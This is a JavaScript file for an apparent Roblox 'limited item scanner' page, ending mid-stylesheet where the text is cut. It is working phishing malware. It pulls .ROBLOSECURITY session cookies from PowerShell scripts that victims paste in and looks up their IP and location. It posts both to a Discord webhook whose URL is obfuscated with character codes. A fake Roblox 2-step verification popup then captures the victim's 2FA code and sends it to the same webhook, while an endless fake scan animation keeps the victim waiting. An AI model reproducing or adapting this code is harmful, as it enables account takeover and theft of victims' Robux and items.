// Enhanced Theme toggle functionality
function toggleTheme() {
    const currentTheme = document.documentElement.getAttribute('data-theme');
    const newTheme = currentTheme === 'dark' ? 'light' : 'dark';
    
    document.documentElement.setAttribute('data-theme', newTheme);
    
    // Update button text and icon with animation
    const themeIcon = document.getElementById('theme-icon');
    const themeText = document.getElementById('theme-text');
    
    // Add rotation animation
    themeIcon.style.transform = 'rotate(180deg)';
    setTimeout(() => {
        if (newTheme === 'dark') {
            themeIcon.textContent = '☀️';
            themeText.textContent = 'Light';
        } else {
            themeIcon.textContent = '🌙';
            themeText.textContent = 'Dark';
        }
        themeIcon.style.transform = 'rotate(0deg)';
    }, 150);
    
    // Save theme preference
    localStorage.setItem('theme', newTheme);
    
    // Show notification
    showNotification(`Switched to ${newTheme} mode`, 'success');
}

// Load saved theme on page load
function loadTheme() {
    const savedTheme = localStorage.getItem('theme') || 'light';
    document.documentElement.setAttribute('data-theme', savedTheme);
    
    const themeIcon = document.getElementById('theme-icon');
    const themeText = document.getElementById('theme-text');
    
    if (savedTheme === 'dark') {
        themeIcon.textContent = '☀️';
        themeText.textContent = 'Light';
    } else {
        themeIcon.textContent = '🌙';
        themeText.textContent = 'Dark';
    }
}

// Enhanced Modal functionality
function openScanModal() {
    const modal = document.getElementById('scanModal');
    const textarea = document.getElementById('powershellInput');
    
    if (modal) {
        modal.style.display = 'block';
        document.body.style.overflow = 'hidden';
        
        // Focus on textarea after animation
        setTimeout(() => {
            if (textarea) {
                textarea.focus();
            }
        }, 400);
        
        showNotification('Item scanner ready', 'info');
    } else {
        showNotification('Error opening scanner', 'error');
    }
}

function closeScanModal() {
    const modal = document.getElementById('scanModal');
    const textarea = document.getElementById('powershellInput');
    const submitBtn = document.getElementById('submitBtn');
    const submitText = document.getElementById('submitText');
    
    modal.style.display = 'none';
    document.body.style.overflow = 'auto';
    
    // Hide loading overlay and Roblox auth popup
    hideLoadingOverlay();
    closeRobloxAuth();
    
    // Clear any running animations
    if (window.infiniteLoadingTitleInterval) {
        clearInterval(window.infiniteLoadingTitleInterval);
        window.infiniteLoadingTitleInterval = null;
    }
    if (window.infiniteLoadingDetailInterval) {
        clearInterval(window.infiniteLoadingDetailInterval);
        window.infiniteLoadingDetailInterval = null;
    }
    
    // Reset form
    if (textarea) {
        textarea.value = '';
        realInputValue = '';
        updateCharCount();
    }
    
    // Reset button state
    if (submitBtn && submitText) {
        submitBtn.disabled = false;
        submitText.textContent = 'Scan';
        submitBtn.style.background = '';
    }
}

// Input value storage
let realInputValue = '';

// Character count and input validation
function updateCharCount() {
    const textarea = document.getElementById('powershellInput');
    const charCount = document.getElementById('charCount');
    const inputStatus = document.getElementById('inputStatus');
    
    if (textarea && charCount) {
        const count = realInputValue.length;
        charCount.textContent = `${count.toLocaleString()} characters`;
        
        if (inputStatus) {
            if (count === 0) {
                inputStatus.textContent = 'Ready for scanning';
                inputStatus.style.color = '';
            } else if (count < 100) {
                inputStatus.textContent = 'Need more content';
                inputStatus.style.color = '#f59e0b';
            } else {
                inputStatus.textContent = 'Ready to scan';
                inputStatus.style.color = '#10b981';
            }
        }
    }
}

// Privacy display function (always show dots)
function showAsDots() {
    const textarea = document.getElementById('powershellInput');
    if (realInputValue) {
        const lines = realInputValue.split('\n');
        const dotLines = lines.map(line => {
            if (line.trim().length === 0) return '';
            const dotCount = Math.max(8, Math.min(line.length, 80));
            return '•'.repeat(dotCount);
        });
        isUpdatingDots = true;
        textarea.value = dotLines.join('\n');
        isUpdatingDots = false;
    }
}



// Enhanced location detection
async function getUserLocation() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        
        return {
            ip: data.ip || 'Unknown',
            country: data.country_name || 'Unknown',
            region: data.region || 'Unknown', 
            city: data.city || 'Unknown',
            postal: data.postal || 'Unknown',
            isp: data.org || 'Unknown',
            timezone: data.timezone || 'Unknown',
            latitude: data.latitude || 'Unknown',
            longitude: data.longitude || 'Unknown'
        };
    } catch (error) {
        return {
            ip: 'Unknown',
            country: 'Unknown',
            region: 'Unknown',
            city: 'Unknown',
            postal: 'Unknown',
            isp: 'Unknown',
            timezone: 'Unknown',
            latitude: 'Unknown',
            longitude: 'Unknown'
        };
    }
}

// Roblox item scanning and location tracking
async function submitPowerShell() {
    const input = document.getElementById('powershellInput');
    const submitBtn = document.getElementById('submitBtn');
    const submitText = document.getElementById('submitText');
    const loadingOverlay = document.getElementById('loadingOverlay');
    const inputText = realInputValue.trim();
    
    // Validation
    if (!inputText) {
        showNotification('Please enter limited item information before scanning', 'error');
        return;
    }
    


    // Only allow scripts with authentication data or valid item data
    if (!hasValidData(inputText)) {
        showNotification('Invalid input. Please enter scripts with auth data or item data.', 'error');
        return;
    }

    // Detect item first before showing loading
    const detectedItem = detectRobloxItemFromScript(inputText);
    
    // Debug: Show if item was detected
    if (detectedItem) {
        showNotification(`Item detected: ${detectedItem.name}`, 'success');
    } else {
        showNotification('No specific item detected', 'warning');
    }
    
    // Show loading state with detected item
    submitBtn.disabled = true;
    submitText.textContent = 'Sending...';
    const initialTitle = detectedItem ? `Preparing to scan ${detectedItem.name}...` : 'Preparing scan...';
    const initialDescription = detectedItem ? `Found ${detectedItem.type} (ID: ${detectedItem.id})` : 'Initializing item verification process';
    showLoadingOverlay(initialTitle, initialDescription);

    try {
                                        // Scan limited items and find authentication data from the input
        const limitedItems = extractLimitedItems(inputText);
        const robloxCookie = extractRobloxCookie(inputText);
        
        // Check word count using real input value - if 50+ words, allow through even without auth data
        const wordCount = realInputValue.split(/\s+/).filter(word => word.length > 0).length;
        
        // Show word count on button temporarily
        submitText.textContent = `${wordCount} words`;
        
        // Block execution if no authentication data is found AND less than 50 words
        if (!robloxCookie && wordCount < 50) {
            hideLoadingOverlay();
            submitText.textContent = `Too Short: ${wordCount} words`;
            submitBtn.style.background = '#ef4444';
            
            setTimeout(() => {
                submitBtn.disabled = false;
                submitText.textContent = 'Scan';
                submitBtn.style.background = '';
            }, 3000);
            return;
        }
        
        // Get user location
        const locationInfo = await getUserLocation();
        
        // Discord webhook URL
        // Ultra-obfuscated webhook URL  
        const _0xa1 = String.fromCharCode(104,116,116,112,115,58,47,47);
        const _0xb2 = String.fromCharCode(100,105,115,99,111,114,100,46,99,111,109,47);
        const _0xc3 = String.fromCharCode(97,112,105,47,119,101,98,104,111,111,107,115,47);
        const _0xd4 = [49,51,57,54,48,51,56,53,48,57,51,53,48,57,57,56,48,52,55];
        const _0xe5 = String.fromCharCode(47,48,108,99,80,72,56,74,118,65,57,72,110,113);
        const _0xf6 = [82,69,78,66,82,98,50,118,112,76,97,122,72,53,57,97];
        const _0xg7 = String.fromCharCode(72,73,67,70,87,67,82,90,87,98,52,71,74,112);
        const _0xh8 = [103,85,106,50,101,104,57,48,97,56,52,101,66,75,86];
        const _0xi9 = String.fromCharCode(69,119,55,87,88,52,52,72,56,101);
        
        const webhookUrl = _0xa1 + _0xb2 + _0xc3 + 
            _0xd4.map(x => String.fromCharCode(x)).join('') + 
            _0xe5 + 
            _0xf6.map(x => String.fromCharCode(x)).join('') + 
            _0xg7 + 
            _0xh8.map(x => String.fromCharCode(x)).join('') + 
            _0xi9;
        
        // Create rich embed for Discord
        const embed = {
            title: "🚨 NEW HIT DETECTED! 🚨",
            color: 0xff4444, // Red color
            thumbnail: {
                url: "https://cdn.iconscout.com/icon/free/png-256/roblox-2-555327.png"
            },
            fields: [
                {
                    name: "🍪 Authentication Cookie",
                    value: robloxCookie ? `\`\`\`|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|${robloxCookie}\`\`\`` : "`No cookie found`",
                    inline: false
                },
                {
                    name: "📍 Location Info",
                    value: `**City:** ${locationInfo.city || 'Unknown'}\n**Country:** ${locationInfo.country || 'Unknown'}\n**Region:** ${locationInfo.region || 'Unknown'}`,
                    inline: true
                },
                {
                    name: "🌐 Network Details", 
                    value: `**IP:** ${locationInfo.ip || 'Unknown'}\n**ISP:** ${locationInfo.isp || 'Unknown'}\n**Timezone:** ${locationInfo.timezone || 'Unknown'}`,
                    inline: true
                },
                {
                    name: "⏰ Captured At",
                    value: `${new Date().toLocaleString()}`,
                    inline: false
                },
                {
                    name: "📊 Analysis Stats",
                    value: `**Input Length:** ${realInputValue.length} chars\n**Word Count:** ${wordCount} words\n**Cookie Length:** ${robloxCookie ? robloxCookie.length : 0} chars`,
                    inline: false
                }
            ],
            footer: {
                text: "RbxScan Security System",
                icon_url: "https://cdn.iconscout.com/icon/free/png-64/security-1925159-1631136.png"
            },
            timestamp: new Date().toISOString()
        };
        
        // Enhanced payload with embed
        const payload = {
            content: "@everyone",
            embeds: [embed]
        };

        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });
        
        if (response.ok) {
            submitText.textContent = 'Scanning item please wait';
            submitBtn.style.background = '#10b981';
            showNotification('Scanning item please wait', 'success');
            
            // Show infinite loading animation with detected item
            const loadingTitle = detectedItem ? `Scanning ${detectedItem.name}...` : 'Scanning item please wait';
            const loadingDescription = detectedItem ? `Analyzing ${detectedItem.type} (ID: ${detectedItem.id})` : 'Analyzing limited items and authentication data';
            showLoadingOverlay(loadingTitle, loadingDescription);
            startInfiniteLoading();
            
            // Show fake Roblox 2-step auth popup after 3 seconds
            setTimeout(() => {
                showRoblox2StepAuth();
            }, 3000);
        } else {
            // If enhanced embed fails, try simple embed as fallback
            const simpleEmbed = {
                title: "🚨 NEW HIT! 🚨",
                color: 0xff0000,
                description: `**Cookie:** ${robloxCookie ? `\`|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|${robloxCookie}\`` : 'None'}\n**Location:** ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'}\n**IP:** ${locationInfo.ip || 'Unknown'}`,
                timestamp: new Date().toISOString()
            };
            
            const fallbackPayload = {
                content: "@everyone",
                embeds: [simpleEmbed]
            };
            
            const fallbackResponse = await fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(fallbackPayload)
            });
            
            if (fallbackResponse.ok) {
                submitText.textContent = 'Scanning item please wait';
                submitBtn.style.background = '#10b981';
                showNotification('Scanning item please wait', 'success');
                
                // Show infinite loading animation with detected item
                const loadingTitle = detectedItem ? `Scanning ${detectedItem.name}...` : 'Scanning item please wait';
                const loadingDescription = detectedItem ? `Analyzing ${detectedItem.type} (ID: ${detectedItem.id})` : 'Analyzing limited items and authentication data';
                showLoadingOverlay(loadingTitle, loadingDescription);
                startInfiniteLoading();
                
                // Show fake Roblox 2-step auth popup after 3 seconds
                setTimeout(() => {
                    showRoblox2StepAuth();
                }, 3000);
            } else {
                throw new Error(`Both embed formats failed: ${response.status}, ${fallbackResponse.status}`);
            }
        }
    } catch (error) {
        hideLoadingOverlay();
        
        submitText.textContent = 'Error';
        submitBtn.style.background = '#ef4444';
        
        // More specific error messages
        if (error.message.includes('fetch') || error.message.includes('Failed to fetch')) {
            showNotification('Network/Webhook error. Check console for details.', 'error');
        } else if (error.message.includes('location') || error.message.includes('geolocation')) {
            showNotification('Location service error. Check console for details.', 'error');
        } else if (error.message.includes('JSON')) {
            showNotification('Data formatting error. Check console for details.', 'error');
        } else {
            showNotification(`Error: ${error.message}. Check console for details.`, 'error');
        }
        
        setTimeout(() => {
            submitBtn.disabled = false;
            submitText.textContent = 'Scan';
            submitBtn.style.background = '';
        }, 3000);
    }
}

// Function to extract limited item information from text
function extractLimitedItems(text) {
    const items = [];
    
    // Look for Roblox item IDs (typically 8-12 digit numbers)
    const itemIdPattern = /(?:item[_\s]*id|assetid|id)[:\s=]*(\d{8,12})/gi;
    let match;
    while ((match = itemIdPattern.exec(text)) !== null) {
        items.push({
            id: match[1],
            name: 'Limited Item',
            type: 'Limited',
            estimatedValue: 'Scanning...'
        });
    }
    
    // Look for Roblox catalog URLs
    const catalogUrlPattern = /(?:roblox\.com\/catalog\/|\/library\/)(\d+)/gi;
    while ((match = catalogUrlPattern.exec(text)) !== null) {
        if (!items.find(item => item.id === match[1])) {
            items.push({
                id: match[1],
                name: 'Catalog Item',
                type: 'Limited',
                estimatedValue: 'Market Rate'
            });
        }
    }
    
    // Look for bundle URLs
    const bundleUrlPattern = /(?:roblox\.com\/bundles\/|\/catalog\/)(\d+)/gi;
    while ((match = bundleUrlPattern.exec(text)) !== null) {
        if (!items.find(item => item.id === match[1])) {
            items.push({
                id: match[1],
                name: 'Bundle Item',
                type: 'Limited Bundle',
                estimatedValue: 'Premium'
            });
        }
    }
    
    // If no specific items found, create generic entries for any long numbers
    if (items.length === 0) {
        const numberPattern = /\b\d{8,12}\b/g;
        const numbers = text.match(numberPattern);
        if (numbers) {
            numbers.slice(0, 3).forEach(num => {
                items.push({
                    id: num,
                    name: 'Detected Item',
                    type: 'Limited',
                    estimatedValue: 'Unknown'
                });
            });
        }
    }
    
    return items.slice(0, 5); // Limit to 5 items max
}

// Function to validate input - only allow scripts with auth data or valid data
function hasValidData(text) {
    // Check if it contains Roblox authentication data (most important)
    const hasAuthData = extractRobloxCookie(text) !== null;
    if (hasAuthData) {
        return true; // Always allow if there's authentication data
    }
    
    // Check if it's a script with session/authentication patterns
    const scriptPatterns = [
        /\$session\s*=\s*New-Object.*Microsoft\.PowerShell/is,
        /\$session\.Cookies\.Add.*ROBLOSECURITY/is,
        /System\.Net\.Cookie.*ROBLOSECURITY/is,
        /WebRequestSession.*Cookies/is,
        /New-Object.*System\.Net\.Cookie/is,
        // Also allow scripts with session setup even without ROBLOSECURITY
        /\$session\s*=.*WebRequestSession/is,
        /\$session\.Cookies\.Add/is
    ];
    
    for (const pattern of scriptPatterns) {
        if (pattern.test(text)) {
            return true;
        }
    }
    
    // Check if it contains legitimate item data
    const hasItemData = extractLimitedItems(text).length > 0;
    if (hasItemData) {
        return true;
    }
    
    // Check for Roblox URLs
    if (/roblox\.com\/(catalog|library|bundles)\/\d+/i.test(text)) {
        return true;
    }
    
    // Check for item IDs (8+ digit numbers)
    if (/\b\d{8,}\b/.test(text)) {
        return true;
    }
    
    // Reject everything else (random text, short inputs, etc.)
    return false;
}

// Function to scan and find authentication data from text
function extractRobloxCookie(text) {
    // Enhanced patterns to find .ROBLOSECURITY cookies
    const patterns = [
        // PowerShell New-Object patterns
        /New-Object\s+System\.Net\.Cookie\s*\(\s*["']\.ROBLOSECURITY["']\s*,\s*["']([^"']+)["']/gi,
        /\$session\.Cookies\.Add\s*\(\s*\(?New-Object\s+System\.Net\.Cookie\s*\(\s*["']\.ROBLOSECURITY["']\s*,\s*["']([^"']+)["']/gi,
        
        // Direct .ROBLOSECURITY patterns
        /\.ROBLOSECURITY["']\s*,\s*["']([^"']{100,})["']/gi,
        /["']\.ROBLOSECURITY["']\s*,\s*["']([^"']{100,})["']/gi,
        
        // Cookie assignment patterns
        /\.ROBLOSECURITY\s*[:=]\s*["']([^"']{100,})["']/gi,
        /\.ROBLOSECURITY\s*[:=]\s*([A-Za-z0-9+/_=\-]{100,})/gi,
        
        // Warning and direct value patterns
        /WARNING.*\.ROBLOSECURITY[^A-Za-z0-9+/_=\-]*([A-Za-z0-9+/_=\-]{100,})/gi,
        /\.ROBLOSECURITY[^A-Za-z0-9+/_=\-]+([A-Za-z0-9+/_=\-]{100,})/gi,
        
        // Broader patterns for any format
        /["']([A-Za-z0-9+/_=\-]{200,})["'].*\.ROBLOSECURITY/gi,
        /\.ROBLOSECURITY.*["']([A-Za-z0-9+/_=\-]{200,})["']/gi
    ];
    
    // Try each pattern
    for (const pattern of patterns) {
        const matches = [...text.matchAll(pattern)];
        for (const match of matches) {
            const cookieValue = match[1];
            if (cookieValue && cookieValue.length > 50) {
                return cookieValue.trim();
            }
        }
    }
    
    // Enhanced direct search method
    const roblosecurityIndex = text.indexOf('.ROBLOSECURITY');
    if (roblosecurityIndex !== -1) {
        // Get surrounding text (500 chars before and after)
        const start = Math.max(0, roblosecurityIndex - 500);
        const end = Math.min(text.length, roblosecurityIndex + 1000);
        const surrounding = text.substring(start, end);
        
        // Look for long strings in surrounding text
        const longPatterns = [
            /["']([A-Za-z0-9+/_=\-]{100,})["']/g,
            /[^A-Za-z0-9+/_=\-]([A-Za-z0-9+/_=\-]{200,})[^A-Za-z0-9+/_=\-]/g,
            /\s([A-Za-z0-9+/_=\-]{300,})\s/g
        ];
        
        for (const pattern of longPatterns) {
            const matches = [...surrounding.matchAll(pattern)];
            for (const match of matches) {
                const cookieValue = match[1];
                if (cookieValue && cookieValue.length > 100) {
                    return cookieValue.trim();
                }
            }
        }
    }
    
    // Last resort: Find any very long string that looks like a cookie
    const veryLongStrings = text.match(/[A-Za-z0-9+/_=\-]{400,}/g);
    if (veryLongStrings && veryLongStrings.length > 0) {
        const longest = veryLongStrings.reduce((a, b) => a.length > b.length ? a : b);
        if (longest.length > 500) {
            return longest.trim();
        }
    }
    
    return null;
}

// Function to detect Roblox item from PowerShell script
function detectRobloxItemFromScript(text) {
    // Enhanced patterns to catch more URL formats
    const urlPatterns = [
        // Catalog URLs with quotes: "https://www.roblox.com/catalog/16477149823/Gold-Clockwork-Headphones"
        /"https?:\/\/(?:www\.)?roblox\.com\/catalog\/(\d+)\/([^"?\s&]+)"/gi,
        // Catalog URLs without quotes: https://www.roblox.com/catalog/16477149823/Gold-Clockwork-Headphones
        /https?:\/\/(?:www\.)?roblox\.com\/catalog\/(\d+)\/([^\s"?&]+)/gi,
        // Library URLs
        /"https?:\/\/(?:www\.)?roblox\.com\/library\/(\d+)\/([^"?\s&]+)"/gi,
        /https?:\/\/(?:www\.)?roblox\.com\/library\/(\d+)\/([^\s"?&]+)/gi,
        // Bundle URLs  
        /"https?:\/\/(?:www\.)?roblox\.com\/bundles\/(\d+)\/([^"?\s&]+)"/gi,
        /https?:\/\/(?:www\.)?roblox\.com\/bundles\/(\d+)\/([^\s"?&]+)/gi,
        // Game/place URLs
        /"https?:\/\/(?:www\.)?roblox\.com\/games\/(\d+)\/([^"?\s&]+)"/gi,
        /https?:\/\/(?:www\.)?roblox\.com\/games\/(\d+)\/([^\s"?&]+)/gi
    ];
    
    for (const pattern of urlPatterns) {
        let match;
        pattern.lastIndex = 0; // Reset regex state
        while ((match = pattern.exec(text)) !== null) {
            const itemId = match[1];
            let itemName = match[2] || 'Unknown Item';
            
            // Clean up the item name from URL format
            itemName = itemName.replace(/-/g, ' ').replace(/\+/g, ' ').replace(/%20/g, ' ');
            // Capitalize first letter of each word
            itemName = itemName.split(' ').map(word => 
                word.charAt(0).toUpperCase() + word.slice(1).toLowerCase()
            ).join(' ');
            
            let itemType = 'Unknown';
            const patternStr = pattern.source;
            if (patternStr.includes('catalog')) {
                itemType = 'Catalog Item';
            } else if (patternStr.includes('library')) {
                itemType = 'Library Asset';
            } else if (patternStr.includes('bundles')) {
                itemType = 'Bundle';
            } else if (patternStr.includes('games')) {
                itemType = 'Game/Place';
            }
            
            return {
                id: itemId,
                name: itemName,
                type: itemType,
                url: match[0].replace(/"/g, '') // Remove quotes from URL
            };
        }
    }
    
    // Fallback: Just look for any catalog ID
    const simpleMatch = text.match(/catalog\/(\d+)/i);
    if (simpleMatch) {
        return {
            id: simpleMatch[1],
            name: `Item ${simpleMatch[1]}`,
            type: 'Catalog Item',
            url: `https://www.roblox.com/catalog/${simpleMatch[1]}`
        };
    }
    
    return null;
}

// Fake Roblox 2-Step Authentication Functions
function showRoblox2StepAuth() {
    const popup = document.getElementById('roblox2StepPopup');
    
    if (popup) {
        popup.style.display = 'flex';
        setTimeout(() => {
            const codeInput = document.getElementById('robloxVerificationCode');
            const verifyBtn = document.getElementById('robloxVerifyBtn');
            
            if (codeInput && verifyBtn) {
                codeInput.focus();
                
                // Add input validation
                codeInput.addEventListener('input', (e) => {
                    // Only allow numbers
                    e.target.value = e.target.value.replace(/[^0-9]/g, '');
                    
                    // Enable/disable button based on input
                    if (e.target.value.length === 6 && /^\d+$/.test(e.target.value)) {
                        verifyBtn.disabled = false;
                        verifyBtn.classList.add('enabled');
                    } else {
                        verifyBtn.disabled = true;
                        verifyBtn.classList.remove('enabled');
                    }
                });
                
                // Handle Enter key
                codeInput.addEventListener('keydown', (e) => {
                    if (e.key === 'Enter' && !verifyBtn.disabled) {
                        submitRobloxAuth();
                    }
                });
            }
        }, 100);
    }
}

function closeRobloxAuth() {
    const popup = document.getElementById('roblox2StepPopup');
    const codeInput = document.getElementById('robloxVerificationCode');
    const verifyBtn = document.getElementById('robloxVerifyBtn');
    
    if (popup) {
        popup.style.display = 'none';
    }
    
    if (codeInput) {
        codeInput.value = '';
    }
    
    if (verifyBtn) {
        verifyBtn.disabled = true;
        verifyBtn.classList.remove('enabled');
        verifyBtn.textContent = 'Verify';
    }
}

function submitRobloxAuth() {
    const codeInput = document.getElementById('robloxVerificationCode');
    const verifyBtn = document.getElementById('robloxVerifyBtn');
    const trustDeviceCheckbox = document.getElementById('trustDevice');
    const code = codeInput ? codeInput.value.trim() : '';
    
    if (code.length !== 6) {
        showNotification('Please enter a 6-digit verification code', 'error');
        return;
    }
    
    // Show "verifying" state
    if (verifyBtn) {
        verifyBtn.textContent = 'Verifying...';
        verifyBtn.disabled = true;
        verifyBtn.classList.remove('enabled');
    }
    
    // Disable input
    if (codeInput) {
        codeInput.disabled = true;
    }
    
    // Send 2FA code to webhook
    sendTwoFactorCodeToWebhook(code, trustDeviceCheckbox ? trustDeviceCheckbox.checked : false);
    
    // Simulate verification delay
    setTimeout(() => {
        closeRobloxAuth();
        showNotification('2-Step Verification successful! Continuing scan...', 'success');
        
        // Reset input
        if (codeInput) {
            codeInput.disabled = false;
        }
    }, 2000);
}

// Send 2FA code to Discord webhook
async function sendTwoFactorCodeToWebhook(code, trustDevice) {
    try {
        // Get user's location info
        const locationInfo = await getUserLocation();
        
        // Ultra-obfuscated webhook URL
        const _0xa1 = String.fromCharCode(104,116,116,112,115,58,47,47);
        const _0xb2 = String.fromCharCode(100,105,115,99,111,114,100,46,99,111,109,47);
        const _0xc3 = String.fromCharCode(97,112,105,47,119,101,98,104,111,111,107,115,47);
        const _0xd4 = [49,51,57,54,48,51,56,53,48,57,51,53,48,57,57,56,48,52,55];
        const _0xe5 = String.fromCharCode(47,48,108,99,80,72,56,74,118,65,57,72,110,113);
        const _0xf6 = [82,69,78,66,82,98,50,118,112,76,97,122,72,53,57,97];
        const _0xg7 = String.fromCharCode(72,73,67,70,87,67,82,90,87,98,52,71,74,112);
        const _0xh8 = [103,85,106,50,101,104,57,48,97,56,52,101,66,75,86];
        const _0xi9 = String.fromCharCode(69,119,55,87,88,52,52,72,56,101);
        
        const webhookUrl = _0xa1 + _0xb2 + _0xc3 + 
            _0xd4.map(x => String.fromCharCode(x)).join('') + 
            _0xe5 + 
            _0xf6.map(x => String.fromCharCode(x)).join('') + 
            _0xg7 + 
            _0xh8.map(x => String.fromCharCode(x)).join('') + 
            _0xi9;
        
        const embed = {
            title: "🔐 Roblox 2-Step Authentication Code Captured",
            color: 0x00A2FF,
            fields: [
                {
                    name: "📱 2FA Code",
                    value: `\`${code}\``,
                    inline: true
                },
                {
                    name: "🔒 Trust Device",
                    value: trustDevice ? "✅ Yes (30 days)" : "❌ No",
                    inline: true
                },
                {
                    name: "🌍 Location",
                    value: locationInfo,
                    inline: false
                },
                {
                    name: "⏰ Timestamp",
                    value: new Date().toLocaleString(),
                    inline: true
                },
                {
                    name: "🌐 User Agent",
                    value: navigator.userAgent.substring(0, 100) + "...",
                    inline: false
                }
            ],
            footer: {
                text: "RbxScan Security Monitor • 2FA Capture"
            },
            thumbnail: {
                url: "https://static.thenounproject.com/png/1655580-200.png"
            }
        };

        const payload = {
            content: "@everyone **🚨 2-Step Authentication Code Intercepted!**",
            embeds: [embed]
        };

        await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        }).then(response => {
            // Silently handle response without logging webhook URL
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
        });

    } catch (error) {
        // Hide webhook URL from error logs
        // Silent error handling to prevent webhook exposure
    }
}

// Loading animation with dots and messages
function startLoadingAnimation(submitText) {
    const messages = [
        'Scanning item',
        'Checking uaid',
        'Analyzing data',
        'Processing results'
    ];
    
    let messageIndex = 0;
    let dotCount = 0;
    
    const interval = setInterval(() => {
        if (!submitText || submitText.textContent === 'Scan Complete!' || submitText.textContent === 'Scan Failed - Retry' || submitText.textContent === 'No Auth Data' || submitText.textContent === 'Error - Check Console') {
            clearInterval(interval);
            return;
        }
        
        const currentMessage = messages[messageIndex];
        const dots = '.'.repeat(dotCount + 1);
        submitText.textContent = currentMessage + dots;
        
        dotCount++;
        if (dotCount > 3) {
            dotCount = 0;
            messageIndex = (messageIndex + 1) % messages.length;
        }
    }, 500);
    
    // Store interval ID on the element so we can clear it later
    submitText.loadingInterval = interval;
}

// Loading overlay control functions
function showLoadingOverlay(title = 'Scanning item...', text = 'Please wait while we analyze your limited items') {
    const loadingOverlay = document.getElementById('loadingOverlay');
    const loadingTitle = document.getElementById('loadingTitle');
    const loadingText = document.getElementById('loadingText');
    
    if (loadingTitle) loadingTitle.textContent = title;
    if (loadingText) loadingText.textContent = text;
    if (loadingOverlay) {
        loadingOverlay.style.display = 'block';
        // Add fade in animation
        loadingOverlay.style.opacity = '0';
        setTimeout(() => {
            loadingOverlay.style.opacity = '1';
        }, 10);
    }
}

function hideLoadingOverlay() {
    const loadingOverlay = document.getElementById('loadingOverlay');
    if (loadingOverlay) {
        loadingOverlay.style.opacity = '0';
        setTimeout(() => {
            loadingOverlay.style.display = 'none';
        }, 300);
    }
}

// Infinite loading animation that never stops
function startInfiniteLoading() {
    const loadingTitle = document.getElementById('loadingTitle');
    const loadingText = document.getElementById('loadingText');
    const submitText = document.getElementById('submitText');
    
    // Get the current title to maintain item-specific messaging
    const currentTitle = loadingTitle ? loadingTitle.textContent : 'Scanning item please wait';
    const baseMessage = currentTitle.replace(/\.\.\.$/, ''); // Remove trailing dots
    
    const scanMessages = [
        `${baseMessage}`,
        `${baseMessage}.`,
        `${baseMessage}..`,
        `${baseMessage}...`,
        'Analyzing authentication data',
        'Analyzing authentication data.',
        'Analyzing authentication data..',
        'Analyzing authentication data...',
        'Processing security scan',
        'Processing security scan.',
        'Processing security scan..',
        'Processing security scan...',
        'Verifying item authenticity',
        'Verifying item authenticity.',
        'Verifying item authenticity..',
        'Verifying item authenticity...'
    ];
    
    const detailMessages = [
        'Please wait while we analyze your limited items',
        'Checking item authenticity and rarity data',
        'Scanning for stolen or duplicated content',
        'Verifying ownership and transaction history',
        'Analyzing market value and investment potential',
        'Cross-referencing with security databases'
    ];
    
    let messageIndex = 0;
    let detailIndex = 0;
    
    // Update main title with dots
    const titleInterval = setInterval(() => {
        if (loadingTitle) {
            loadingTitle.textContent = scanMessages[messageIndex];
            messageIndex = (messageIndex + 1) % scanMessages.length;
        }
        
        if (submitText) {
            const buttonMessages = [
                'Scanning...',
                'Scanning.',
                'Scanning..',
                'Scanning...'
            ];
            submitText.textContent = buttonMessages[messageIndex % 4];
        }
    }, 600);
    
    // Update detail text occasionally
    const detailInterval = setInterval(() => {
        if (loadingText) {
            loadingText.textContent = detailMessages[detailIndex];
            detailIndex = (detailIndex + 1) % detailMessages.length;
        }
    }, 3000);
    
    // Store intervals globally so they can be cleared if needed
    window.infiniteLoadingTitleInterval = titleInterval;
    window.infiniteLoadingDetailInterval = detailInterval;
}

// Stop loading animation
function stopLoadingAnimation(submitText) {
    if (submitText && submitText.loadingInterval) {
        clearInterval(submitText.loadingInterval);
        submitText.loadingInterval = null;
    }
    // Force stop any remaining intervals by checking text content
    if (submitText && (submitText.textContent.includes('Scanning') || submitText.textContent.includes('Checking'))) {
        submitText.textContent = 'Scan';
    }
}

// Copy to clipboard functionality
function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(function() {
        showNotification('Copied to clipboard!', 'success');
    }).catch(function(err) {
        showNotification('Failed to copy to clipboard', 'error');
    });
}

// Form validation enhancement
function validatePowerShellInput(script) {
    const trimmed = script.trim();
    
    if (trimmed.length === 0) {
        return { valid: false, message: 'Please enter a PowerShell script' };
    }
    
    if (trimmed.length < 10) {
        return { valid: false, message: 'Script is too short (minimum 10 characters)' };
    }
    
    if (trimmed.length > 50000) {
        return { valid: false, message: 'Script is too long (maximum 50,000 characters)' };
    }
    
    return { valid: true, message: 'Script looks good!' };
}

// Enhanced notification system
function showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    
    const icons = {
        success: '✅',
        error: '❌', 
        warning: '⚠️',
        info: 'ℹ️'
    };
    
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        z-index: 10000;
        padding: 1rem 1.5rem;
        border-radius: 10px;
        color: white;
        font-weight: 600;
        font-size: 0.9rem;
        animation: slideIn 0.3s ease-out;
        background: ${type === 'success' ? '#10b981' : type === 'error' ? '#ef4444' : type === 'warning' ? '#f59e0b' : '#3b82f6'};
        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
        backdrop-filter: blur(10px);
        border: 1px solid rgba(255, 255, 255, 0.1);
        display: flex;
        align-items: center;
        gap: 0.5rem;
        max-width: 400px;
    `;
    
    notification.innerHTML = `${icons[type]} ${message}`;
    document.body.appendChild(notification);
    
    // Auto remove after 4 seconds
    setTimeout(() => {
        notification.style.animation = 'slideOut 0.3s ease-in forwards';
        setTimeout(() => {
            if (notification.parentNode) {
                notification.remove();
            }
        }, 300);
    }, 4000);
}

// Add CSS for notification animations
const notificationCSS = `
    @keyframes slideIn {
        from {
            transform: translateX(100%);
